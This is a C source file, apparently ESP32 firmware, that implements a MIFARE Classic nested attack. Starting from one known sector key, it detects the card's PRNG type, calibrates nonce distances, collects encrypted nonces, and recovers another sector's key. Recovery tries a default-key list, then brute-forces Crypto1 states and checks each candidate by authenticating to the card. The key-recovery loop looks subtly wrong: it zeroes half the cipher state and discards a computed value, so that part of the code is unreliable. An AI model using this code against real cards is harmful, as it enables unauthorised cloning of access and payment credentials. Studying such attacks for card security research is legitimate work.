#include "mf_classic_nested.h"
#include <nfc.h>
#include "esp_log.h"
#include "esp_timer.h"
#include <errno.h>
#include <string.h>

static const char *TAG = "mfc_nested";
static inline int64_t uptime_ms(void) { return esp_timer_get_time() / 1000; }

#define PRNG_DETECT_NONCES    5
#define PRNG_HARD_THRESHOLD   3
#define CALIBRATION_ROUNDS   20
#define MAX_NESTED_NONCES     8
#define NESTED_RETRY_MAX     60

int nested_detect_prng(const uint8_t *uid, uint8_t known_sector,
                       uint8_t known_key_type, const uint8_t *known_key,
                       enum nested_prng_type *prng_type)
{
    *prng_type = NESTED_PRNG_UNKNOWN;
    uint8_t trailer = mfc_sector_trailer(known_sector);
    int hard_count = 0;

    for(int i = 0; i < PRNG_DETECT_NONCES; i++) {
        if(i > 0) nfc_reactivate(NULL);
        int ret = mfc_auth(trailer, known_key_type, known_key, uid);
        if(ret != 0) return ret;

        struct mfc_nested_nonce_raw nonce;
        ret = mfc_collect_nested_nonce(trailer, known_key_type, uid, &nonce);
        if(ret != 0) { nfc_reactivate(NULL); continue; }

        uint32_t nt = crypto1_decrypt_nt_enc(
            bytes_to_be32(uid), nonce.nt_enc, key_to_uint64(known_key));
        if(!crypto1_is_weak_prng_nonce(nt)) hard_count++;
    }

    *prng_type = (hard_count >= PRNG_HARD_THRESHOLD)
                 ? NESTED_PRNG_HARD : NESTED_PRNG_WEAK;
    ESP_LOGI(TAG, "PRNG type: %s (hard_count=%d)",
             (*prng_type == NESTED_PRNG_HARD) ? "hard" : "weak", hard_count);
    return 0;
}

struct calibration { uint32_t d_min; uint32_t d_max; };

static int nested_calibrate(const struct nested_params *params, struct calibration *cal)
{
    uint8_t known_trailer = mfc_sector_trailer(params->known_sector);
    uint32_t cuid = bytes_to_be32((const uint8_t *)&params->uid);
    uint64_t key64 = key_to_uint64(params->known_key);
    uint32_t nt_enc_arr[CALIBRATION_ROUNDS];
    int collected = 0;

    nfc_reactivate(NULL);
    int ret = mfc_auth(known_trailer, params->known_key_type, params->known_key,
                       (const uint8_t *)&params->uid);
    if(ret != 0) return ret;

    for(int i = 0; i < CALIBRATION_ROUNDS; i++) {
        struct mfc_nested_nonce_raw nonce;
        ret = mfc_collect_nested_nonce(known_trailer, params->known_key_type,
                                       (const uint8_t *)&params->uid, &nonce);
        if(ret != 0) {
            nfc_reactivate(NULL);
            ret = mfc_auth(known_trailer, params->known_key_type,
                           params->known_key, (const uint8_t *)&params->uid);
            if(ret != 0) return ret;
            continue;
        }
        nt_enc_arr[collected++] = nonce.nt_enc;
        nfc_reactivate(NULL);
        ret = mfc_auth(known_trailer, params->known_key_type,
                       params->known_key, (const uint8_t *)&params->uid);
        if(ret != 0) return ret;
    }

    if(collected < 2) return -EAGAIN;

    uint32_t nt_prev = crypto1_decrypt_nt_enc(cuid, nt_enc_arr[0], key64);
    uint32_t distances[CALIBRATION_ROUNDS];
    int ndist = 0;

    for(int i = 1; i < collected; i++) {
        uint32_t nt_dec = crypto1_decrypt_nt_enc(cuid, nt_enc_arr[i], key64);
        bool found = false;
        for(uint32_t d = 0; d < 65536 && !found; d++) {
            if(crypto1_prng_successor(nt_prev, d) == nt_dec) {
                distances[ndist++] = d;
                found = true;
            }
        }
        nt_prev = nt_dec;
    }

    if(ndist < 2) return -EAGAIN;

    uint32_t dmin = UINT32_MAX, dmax = 0;
    uint64_t sum = 0;
    for(int i = 0; i < ndist; i++) {
        sum += distances[i];
        if(distances[i] < dmin) dmin = distances[i];
        if(distances[i] > dmax) dmax = distances[i];
    }

    uint32_t mean = (uint32_t)(sum / ndist);
    uint64_t var_sum = 0;
    for(int i = 0; i < ndist; i++) {
        int32_t diff = (int32_t)distances[i] - (int32_t)mean;
        var_sum += (uint64_t)((int64_t)diff * diff);
    }
    uint32_t stddev = 1;
    if(ndist > 1) {
        uint64_t variance = var_sum / (ndist - 1);
        while(stddev * stddev < variance) stddev++;
    }

    uint32_t filt_min = UINT32_MAX, filt_max = 0;
    for(int i = 0; i < ndist; i++) {
        int32_t diff = (int32_t)distances[i] - (int32_t)mean;
        if(diff < 0) diff = -diff;
        if((uint32_t)diff <= 3 * stddev) {
            if(distances[i] < filt_min) filt_min = distances[i];
            if(distances[i] > filt_max) filt_max = distances[i];
        }
    }

    cal->d_min = (filt_min > 3) ? filt_min - 3 : 0;
    cal->d_max = filt_max + 3;
    ESP_LOGI(TAG, "calibration: d_min=%u d_max=%u (raw range %u-%u, n=%d)",
             (unsigned)cal->d_min, (unsigned)cal->d_max,
             (unsigned)dmin, (unsigned)dmax, ndist);
    return 0;
}

struct nested_nonce_data {
    uint32_t cuid;
    uint32_t nt;
    uint32_t nt_enc;
    uint8_t  par_enc;
};

static int nested_collect_one(const struct nested_params *params,
                              const struct calibration *cal,
                              struct nested_nonce_data *out)
{
    uint8_t known_trailer = mfc_sector_trailer(params->known_sector);
    uint8_t target_trailer = mfc_sector_trailer(params->target_sector);
    uint32_t cuid = bytes_to_be32((const uint8_t *)&params->uid);
    uint64_t key64 = key_to_uint64(params->known_key);

    nfc_reactivate(NULL);
    int ret = mfc_auth(known_trailer, params->known_key_type, params->known_key,
                       (const uint8_t *)&params->uid);
    if(ret != 0) return ret;

    struct mfc_nested_nonce_raw prev_nonce;
    ret = mfc_collect_nested_nonce(known_trailer, params->known_key_type,
                                   (const uint8_t *)&params->uid, &prev_nonce);
    if(ret != 0) return ret;

    nfc_reactivate(NULL);
    ret = mfc_auth(known_trailer, params->known_key_type, params->known_key,
                   (const uint8_t *)&params->uid);
    if(ret != 0) return ret;

    struct mfc_nested_nonce_raw target_nonce;
    ret = mfc_collect_nested_nonce(target_trailer, params->target_key_type,
                                   (const uint8_t *)&params->uid, &target_nonce);
    if(ret != 0) return ret;

    uint32_t prev_plain = crypto1_decrypt_nt_enc(cuid, prev_nonce.nt_enc, key64);

    uint32_t found_nt = 0;
    int found_count = 0;
    for(uint32_t d = cal->d_min; d <= cal->d_max; d++) {
        uint32_t candidate = crypto1_prng_successor(prev_plain, d);
        uint32_t ks = candidate ^ target_nonce.nt_enc;
        if(crypto1_nonce_matches_encrypted_parity(candidate, ks, target_nonce.par_enc)) {
            found_nt = candidate;
            found_count++;
            if(found_count > 1) break;
        }
    }

    if(found_count != 1) return -EAGAIN;

    out->cuid = cuid;
    out->nt = found_nt;
    out->nt_enc = target_nonce.nt_enc;
    out->par_enc = target_nonce.par_enc;
    return 0;
}

static bool try_key_for_nonces(uint64_t key64, const struct nested_nonce_data *nonces, int nnonces)
{
    for(int i = 0; i < nnonces; i++) {
        uint32_t nt_dec = crypto1_decrypt_nt_enc(nonces[i].cuid, nonces[i].nt_enc, key64);
        if(!crypto1_is_weak_prng_nonce(nt_dec)) return false;
        uint32_t ks = nt_dec ^ nonces[i].nt_enc;
        if(!crypto1_nonce_matches_encrypted_parity(nt_dec, ks, nonces[i].par_enc)) return false;
    }
    return true;
}

int nested_attack(const struct nested_params *params,
                  struct nested_result *result,
                  nested_progress_cb progress, void *ctx)
{
    int64_t t_start = uptime_ms();
    memset(result, 0, sizeof(*result));

    if(progress) progress(NESTED_PHASE_DETECT_PRNG, 0, ctx);

    enum nested_prng_type prng;
    int ret = nested_detect_prng((const uint8_t *)&params->uid,
                                 params->known_sector, params->known_key_type,
                                 params->known_key, &prng);
    if(ret != 0) return ret;
    result->prng_type = prng;

    if(prng == NESTED_PRNG_HARD) {
        result->elapsed_ms = (uint32_t)(uptime_ms() - t_start);
        return -ENOTSUP;
    }

    if(progress) progress(NESTED_PHASE_CALIBRATE, 10, ctx);

    struct calibration cal;
    nfc_reactivate(NULL);
    ret = nested_calibrate(params, &cal);
    if(ret != 0) return ret;

    if(progress) progress(NESTED_PHASE_COLLECT, 30, ctx);

    struct nested_nonce_data nonces[MAX_NESTED_NONCES];
    int nnonces = 0;
    int attempts = 0;

    while(nnonces < MAX_NESTED_NONCES && attempts < NESTED_RETRY_MAX) {
        ret = nested_collect_one(params, &cal, &nonces[nnonces]);
        if(ret == 0) {
            bool dup = false;
            for(int j = 0; j < nnonces; j++) {
                if(nonces[j].nt_enc == nonces[nnonces].nt_enc) { dup = true; break; }
            }
            if(!dup) {
                nnonces++;
                if(progress)
                    progress(NESTED_PHASE_COLLECT,
                             30 + (nnonces * 40 / MAX_NESTED_NONCES), ctx);
            }
        }
        attempts++;
    }

    if(nnonces == 0) return -EAGAIN;
    ESP_LOGI(TAG, "collected %d nonces in %d attempts", nnonces, attempts);

    if(progress) progress(NESTED_PHASE_SOLVE, 70, ctx);

    for(size_t ki = 0; ki < mfc_default_keys_count; ki++) {
        uint64_t key64 = key_to_uint64(mfc_default_keys[ki]);
        if(try_key_for_nonces(key64, nonces, nnonces)) {
            result->found = true;
            memcpy(result->key, mfc_default_keys[ki], 6);
            goto done;
        }
    }

    for(int n = 0; n < nnonces && !result->found; n++) {
        uint32_t ks = nonces[n].nt ^ nonces[n].nt_enc;
        (void)ks;

        for(uint32_t i = 0; i < (1U << 16) && !result->found; i++) {
            struct crypto1_state test;
            test.odd  = (i << 8) | ((ks >> 16) & 0xFF);
            test.even = 0;

            crypto1_lfsr_rollback_word(&test, nonces[n].nt_enc ^ nonces[n].cuid, 1);
            crypto1_lfsr_rollback_word(&test, nonces[n].cuid, 0);

            uint64_t key64 = 0;
            for(int b = 23; b >= 0; b--) {
                key64 = (key64 << 1) | ((test.odd >> b) & 1);
                key64 = (key64 << 1) | ((test.even >> b) & 1);
            }
            uint64_t key_reordered = 0;
            for(int b = 0; b < 48; b++)
                key_reordered |= (uint64_t)((key64 >> (b ^ 7)) & 1) << b;

            if(try_key_for_nonces(key_reordered, nonces, nnonces)) {
                uint8_t target_trailer = mfc_sector_trailer(params->target_sector);
                nfc_reactivate(NULL);
                uint8_t key_bytes[6];
                uint64_to_key(key_reordered, key_bytes);

                if(mfc_auth(target_trailer, params->target_key_type, key_bytes,
                            (const uint8_t *)&params->uid) == 0) {
                    result->found = true;
                    memcpy(result->key, key_bytes, 6);
                }
            }
        }
    }

done:
    if(progress) progress(NESTED_PHASE_DONE, 100, ctx);
    result->elapsed_ms = (uint32_t)(uptime_ms() - t_start);

    if(result->found) {
        ESP_LOGI(TAG, "key found in %u ms: %02x%02x%02x%02x%02x%02x",
                 (unsigned)result->elapsed_ms,
                 result->key[0], result->key[1], result->key[2],
                 result->key[3], result->key[4], result->key[5]);
    }
    return result->found ? 0 : -ENOENT;
}
